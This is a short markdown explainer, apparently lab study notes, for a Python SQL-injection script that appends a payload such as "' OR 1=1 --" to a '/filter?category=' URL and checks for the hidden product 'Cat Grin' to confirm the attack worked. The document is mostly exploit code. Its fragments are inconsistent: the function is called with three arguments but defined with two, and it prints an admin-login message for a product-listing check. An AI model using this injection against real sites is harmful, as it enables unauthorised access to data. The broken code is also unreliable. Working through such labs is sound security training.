# About the python script

- It takes two cmd line params
    - the URL and the SQLi paylod 
    - takes those two parameters/arguments
     
``` python
  def main():
  try:
      url = sys.argv[1].strip()
      payload = sys.argv[2].strip() 
```
`./sqli-01.py https://webacademey.net "' OR 1=1 --`

<br>
 
- And if incorrect number of parameters..
``` python
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)
```
<br>

- function that evaluates to True if SQLi present:
- accepts the two args- URL & Payload
``` python
    if exploit_sqli(s, url, sqli_payload):
        print("[+] Success! You are now logged in as admin.")
    else:
        print("[-] Denied!.")
```
<br>

- The exploit function
    - accepts the two args- URL & Payload concatenates the URL and the payload after the = sign
``` python
# the exploit function, accepts the URL and the SQLi payload as args
def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies) 
```
<br>

- Check for presence of an unreleased item on the page to confirm successful exploitation
  - "Cat Grin", is one of those items
```python
 if "Cat Grin" in r.text:
        return True
    else:
        return False
```
